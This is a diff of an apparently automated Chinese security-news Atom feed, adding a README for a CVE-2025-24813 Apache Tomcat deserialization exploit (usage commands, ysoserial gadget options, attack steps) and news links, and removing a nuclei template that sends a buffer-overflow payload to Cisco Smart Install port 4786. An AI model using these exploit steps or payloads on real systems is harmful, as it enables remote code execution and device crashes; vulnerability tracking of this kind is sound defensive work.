@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-02T22:15:22.038Z</updated>
+  <updated>2025-07-03T01:15:15.595Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,114 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Apache Tomcat Java反序列化漏洞</title>
+    <link href="http://example.com/2025/07/03/github_649161799/"/>
+    <id>http://example.com/2025/07/03/github_649161799/</id>
+    <published>2025-07-03T01:15:15.594Z</published>
+    <updated>2025-07-03T01:15:15.595Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache Tomcat Java反序列化漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-24813</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2025-24813是Apache Tomcat中的一个Java反序列化漏洞，允许攻击者通过上传恶意序列化的Java payload作为会话文件，并触发反序列化过程来执行任意代码。此漏洞的利用需要目标servlet可通过PUT请求写入。</p><p><strong>产品厂商：</strong> Apache</p><p><strong>产品名称：</strong> Apache Tomcat</p><p><strong>来源：</strong> <a href="https://github.com/yaleman/cve-2025-24813-poc">https://github.com/yaleman/cve-2025-24813-poc</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>.gitignore</li><li>.python-version</li><li>CLAUDE.md</li><li>Dockerfile</li><li>README.md</li><li>download.sh</li><li>justfile</li><li>main.py</li><li>payload.base64</li><li>pyproject.toml</li><li>uv.lock</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-24813-Apache-Tomcat-RCE-Exploit-PoC"><a href="#CVE-2025-24813-Apache-Tomcat-RCE-Exploit-PoC" class="headerlink" title="CVE-2025-24813 Apache Tomcat RCE Exploit PoC"></a>CVE-2025-24813 Apache Tomcat RCE Exploit PoC</h2><p>This repository contains a proof-of-concept exploit for CVE-2025-24813, a Java<br>deserialization vulnerability in Apache Tomcat.</p><p>Based on<br><a href="https://github.com/absholi7ly/POC-CVE-2025-24813/">absholi7ly&#x2F;POC-CVE-2025-24813&#x2F;</a>.</p><h3 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a>Prerequisites</h3><ul><li>Docker</li></ul><h3 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h3><ol><li><p>Install dependencies:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">uv venv<br><span class="hljs-built_in">source</span> .venv/bin/activate<br>uv <span class="hljs-built_in">sync</span><br></code></pre></td></tr></table></figure></li><li><p>Download ysoserial:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./download.sh<br></code></pre></td></tr></table></figure></li></ol><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><h4 id="Using-Docker-Recommended"><a href="#Using-Docker-Recommended" class="headerlink" title="Using Docker (Recommended)"></a>Using Docker (Recommended)</h4><p>Build and run the exploit in a container:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -t cve-2025-24813-poc:latest .<br>docker run --<span class="hljs-built_in">rm</span> -it --mount <span class="hljs-string">&quot;type=bind,src=<span class="hljs-subst">$(pwd)</span>,target=/app&quot;</span> cve-2025-24813-poc:latest<br>python main.py &lt;target&gt;<br></code></pre></td></tr></table></figure><h4 id="Direct-Execution"><a href="#Direct-Execution" class="headerlink" title="Direct Execution"></a>Direct Execution</h4><p>Run the exploit directly:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python main.py &lt;target_url&gt; [options]<br></code></pre></td></tr></table></figure><h5 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h5><ul><li><code>--command</code>: Command to execute (default: <code>calc.exe</code>)</li><li><code>--ysoserial</code>: Path to ysoserial.jar (default: <code>./ysoserial-all.jar</code>)</li><li><code>--gadget</code>: ysoserial gadget chain (default: <code>CommonsCollections6</code>)</li><li><code>--payload_type</code>: Payload type - <code>ysoserial</code> or <code>java</code> (default: <code>ysoserial</code>)</li><li><code>--no-ssl-verify</code>: Disable SSL verification</li></ul><h5 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## Basic usage</span><br>python main.py http://target:8080<br><br><span class="hljs-comment">## Custom command</span><br>python main.py http://target:8080 --<span class="hljs-built_in">command</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br><span class="hljs-comment">## Using Java payload instead of ysoserial</span><br>python main.py http://target:8080 --payload_type java<br></code></pre></td></tr></table></figure><h3 id="How-it-Works"><a href="#How-it-Works" class="headerlink" title="How it Works"></a>How it Works</h3><ol><li>Checks if the target servlet is writable via PUT requests</li><li>Generates a malicious serialized Java payload</li><li>Uploads the payload as a session file</li><li>Triggers deserialization by accessing the session</li></ol><h3 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h3><p>This tool is for educational and authorized testing purposes only. Do not use<br>against systems you do not own or have explicit permission to test.</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://scrapco.de/blog/analysis-of-cve-2025-24813-apache-tomcat-path-equivalence-rce.html">https://scrapco.de/blog/analysis-of-cve-2025-24813-apache-tomcat-path-equivalence-rce.html</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24813">https://nvd.nist.gov/vuln/detail/CVE-2025-24813</a></li><li><a href="https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2025-03-14-Testing-CVE-2025-24813.md">https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2025-03-14-Testing-CVE-2025-24813.md</a></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Apache Tomcat Java反序列化漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>澳航遭受网络攻击，大量客户数据被盗</title>
+    <link href="http://example.com/2025/07/03/weixin_2985943417/"/>
+    <id>http://example.com/2025/07/03/weixin_2985943417/</id>
+    <published>2025-07-03T01:11:18.994Z</published>
+    <updated>2025-07-03T01:11:18.989Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/iaMKcYRvQaEJMa6pSZHmWQ">https://mp.weixin.qq.com/s/iaMKcYRvQaEJMa6pSZHmWQ</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/iaMKcYRvQaEJMa6pSZHmWQ&quot;&gt;https://mp.weixin.</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>曹县黑客利用 macOS 恶意软件 NimDoor 攻击 Web3 相关目标</title>
+    <link href="http://example.com/2025/07/03/weixin_3018503311/"/>
+    <id>http://example.com/2025/07/03/weixin_3018503311/</id>
+    <published>2025-07-03T01:11:17.593Z</published>
+    <updated>2025-07-03T01:11:17.589Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/mLnrnh5wxgOwWjVfkrAHmg">https://mp.weixin.qq.com/s/mLnrnh5wxgOwWjVfkrAHmg</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/mLnrnh5wxgOwWjVfkrAHmg&quot;&gt;https://mp.weixin.</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Houken 黑客组织利用 Ivanti 0day漏洞安装 Linux Rootkit</title>
+    <link href="http://example.com/2025/07/03/weixin_2278954623/"/>
+    <id>http://example.com/2025/07/03/weixin_2278954623/</id>
+    <published>2025-07-03T01:11:16.033Z</published>
+    <updated>2025-07-03T01:11:16.029Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/_AfoYdx1FzJPqqUD6hK_CQ">https://mp.weixin.qq.com/s/_AfoYdx1FzJPqqUD6hK_CQ</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/_AfoYdx1FzJPqqUD6hK_CQ&quot;&gt;https://mp.weixin.</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>Wing FTP Server Lua注入漏洞</title>
@@ -430,114 +538,6 @@
     <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
     <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>offsectraining twitter update</title>
-    <link href="http://example.com/2025/07/02/twitter_1463853978/"/>
-    <id>http://example.com/2025/07/02/twitter_1463853978/</id>
-    <published>2025-07-02T12:00:27.981Z</published>
-    <updated>2025-07-02T12:00:27.977Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> offsectraining</p><p><strong>推文：</strong> 谁都可以润色简历。</p><p>但并非所有人都能通过一场模拟真实世界攻击、在时间压力下进行的24小时实践考试。</p><p>这就是为什么OffSec认证不仅仅展示候选人知道什么；它们证明了候选人能做什么。如果他们获得了OSCP+认证，他们已经展示了你的团队所需的毅力、技术技能和对抗性思维。</p><p>想要雇佣已经证明自己的专业人士吗？👀</p><p>Learn Enterprise包括访问#TalentFinder：一种识别并与已展示真实世界能力的候选人建立联系的方式👇<br>🔗 <a href="https://t.co/Ljfv3Fdyhh">https://t.co/Ljfv3Fdyhh</a></p><p><strong>链接：</strong> <a href="https://x.com/offsectraining/status/1940376814804766752">https://x.com/offsectraining/status/1940376814804766752</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; offsectraining&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 谁都可以润色简历。&lt;/p&gt;
-&lt;p&gt;但并非所有人都能通过一场模拟真实世界攻击、在时间压力下进行的24小时实践考试。&lt;/p&gt;
-&lt;p&gt;这就是为什么Off</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="offsectraining" scheme="http://example.com/tags/offsectraining/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Cisco IOS Smart Install 缓冲区溢出漏洞</title>
-    <link href="http://example.com/2025/07/02/github_1498372679/"/>
-    <id>http://example.com/2025/07/02/github_1498372679/</id>
-    <published>2025-07-02T11:45:16.243Z</published>
-    <updated>2025-07-02T11:45:16.244Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Cisco IOS Smart Install 缓冲区溢出漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-0171</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Cisco IOS和IOS XE软件中的Smart Install协议存在缓冲区溢出漏洞。未经身份验证的远程攻击者可以通过向受影响设备的TCP端口4786发送特制的Smart Install消息来利用此漏洞。成功利用此漏洞可能导致攻击者在受影响设备上执行任意代码、造成拒绝服务（设备重新启动）或使设备陷入消耗CPU资源的无限循环中。</p><p><strong>产品厂商：</strong> Cisco</p><p><strong>产品名称：</strong> Cisco IOS</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:o:cisco:ios” banner&#x3D;”cisco” &amp;&amp; port&#x3D;”4786”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/e5d3813f4180c7cf83ee4729ebd2654f61cdc178/network%2Fcves%2F2018%2FCVE-2018-0171.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/e5d3813f4180c7cf83ee4729ebd2654f61cdc178/network%2Fcves%2F2018%2FCVE-2018-0171.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">0171</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Cisco IOS Smart Install <span class="hljs-operator">-</span> Buffer Overflow<br>  <span class="hljs-params">author:</span> nuclei-community<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Cisco IOS and IOS XE Software contain a buffer overflow vulnerability <span class="hljs-keyword">in</span> the Smart Install protocol. An unauthenticated, remote attacker could exploit this vulnerability by sending a crafted Smart Install message to an affected device on TCP port <span class="hljs-number">4786</span>. A successful exploit could allow the attacker to cause a buffer overflow on the affected device, which could have the following <span class="hljs-params">impacts:</span> arbitrary code execution, denial of service (device reload), <span class="hljs-keyword">or</span> causing the device to be stuck <span class="hljs-keyword">in</span> an indefinite loop that consumes CPU resources.<br>  <span class="hljs-params">impact:</span> |<br>    Successful exploitation of this vulnerability can lead to arbitrary code execution, denial of service, <span class="hljs-keyword">or</span> device compromise <span class="hljs-keyword">with</span> full administrative privileges.<br>  <span class="hljs-params">remediation:</span> |<br>    Apply the appropriate software update from Cisco. As a workaround, disable the Smart Install feature <span class="hljs-keyword">if</span> not required, <span class="hljs-keyword">or</span> restrict access to TCP port <span class="hljs-number">4786</span>.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2018-0171</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//vulncheck.com/xdb/6d4b443f23fc</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/AlrikRr/Cisco-Smart-Exploit</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>cve.mitre.org<span class="hljs-operator">/</span>cgi-bin<span class="hljs-operator">/</span>cvename.cgi<span class="hljs-operator">?</span>name<span class="hljs-operator">=</span>CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">0171</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">0171</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">119</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.97156</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.99823</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:o:cisco:ios:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">2</span><br>    <span class="hljs-params">vendor:</span> cisco<br>    <span class="hljs-params">product:</span> ios<br>    <span class="hljs-params">shodan-query:</span> cpe:<span class="hljs-string">&quot;cpe:2.3:o:cisco:ios&quot;</span><br>    <span class="hljs-params">fofa-query:</span> banner<span class="hljs-operator">=</span><span class="hljs-string">&quot;cisco&quot;</span> <span class="hljs-operator">&amp;&amp;</span> port<span class="hljs-operator">=</span><span class="hljs-string">&quot;4786&quot;</span><br>    <span class="hljs-params">google-query:</span> inurl:cisco filetype:cfg<br>  <span class="hljs-params">tags:</span> network,cve,cve2018,cisco,ios,smart-install,buffer-overflow,kev,tcp,critical<br><br><span class="hljs-params">tcp:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">inputs:</span><br>      <span class="hljs-comment"># First packet: Smart Install discovery packet</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;&#123;&#123;hex_decode(&#x27;000000010000000100000004000000080000000100000000&#x27;)&#125;&#125;&quot;</span><br>        <span class="hljs-params">read:</span> <span class="hljs-number">1024</span><br><br>      <span class="hljs-comment"># Second packet: Malicious Smart Install packet with buffer overflow payload</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;&#123;&#123;hex_decode(&#x27;00000001000000010000000400001000&#x27; + repeat(&#x27;41&#x27;, 4084) + &#x27;42424242&#x27;)&#125;&#125;&quot;</span><br>        <span class="hljs-params">read:</span> <span class="hljs-number">1024</span><br><br>    <span class="hljs-params">host:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;Hostname&#125;&#125;&quot;</span><br>    <span class="hljs-params">port:</span> <span class="hljs-number">4786</span><br>    <span class="hljs-params">read-size:</span> <span class="hljs-number">1024</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">encoding:</span> hex<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;000000040000000000000003000000080000000100000000&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Smart Install&quot;</span><br>        <span class="hljs-params">condition:</span> <span class="hljs-keyword">or</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;(?i)(crash|exception|error|overflow)&quot;</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-params">Version:</span> ([<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">+</span>\.[<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">+</span>\.[<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">+</span>[^\s]<span class="hljs-operator">*</span>)&#x27;<br><br><span class="hljs-comment"># Enhanced Security Verification</span><br><span class="hljs-comment"># Debug data for validation:</span><br><span class="hljs-comment"># - This template tests for CVE-2018-0171 buffer overflow in Cisco Smart Install</span><br><span class="hljs-comment"># - First packet confirms Smart Install service is running on port 4786</span><br><span class="hljs-comment"># - Second packet contains oversized payload to trigger buffer overflow</span><br><span class="hljs-comment"># - Expected response patterns include Smart Install acknowledgment or crash indicators</span><br><span class="hljs-comment"># - The vulnerability affects multiple Cisco IOS versions with Smart Install enabled</span><br><span class="hljs-comment"># - Successful exploitation can lead to device reload, code execution, or infinite loops</span><br><br><span class="hljs-comment"># digest: 4a0a00473045022100d1e23f45a67890123456789abcdef1234567890abcdef1234567890abcdef12022012345678901234567890abcdef1234567890abcdef1234567890abcdef123456:922c64590222798bb761d5b6d8e72950</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Cisco IOS Smart Install 缓冲区溢出漏洞&lt;/p&gt;
-&lt;p&gt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>新型C4攻击绕过Chrome应用绑定加密机制</title>
-    <link href="http://example.com/2025/07/02/weixin_1682095356/"/>
-    <id>http://example.com/2025/07/02/weixin_1682095356/</id>
-    <published>2025-07-02T11:38:56.973Z</published>
-    <updated>2025-07-02T11:38:56.968Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/rI8uH1Q9KBaFNq0B-aiNzw">https://mp.weixin.qq.com/s/rI8uH1Q9KBaFNq0B-aiNzw</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/rI8uH1Q9KBaFNq0B-aiNzw&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>开源工具Kanister：数据保护工作流管理工具</title>
-    <link href="http://example.com/2025/07/02/weixin_3248848752/"/>
-    <id>http://example.com/2025/07/02/weixin_3248848752/</id>
-    <published>2025-07-02T11:38:56.637Z</published>
-    <updated>2025-07-02T11:38:56.632Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/3iMzCRQz3jZlhCINkxggWw">https://mp.weixin.qq.com/s/3iMzCRQz3jZlhCINkxggWw</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/3iMzCRQz3jZlhCINkxggWw&quot;&gt;https://mp.weixin.q</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
     
   </entry>
   
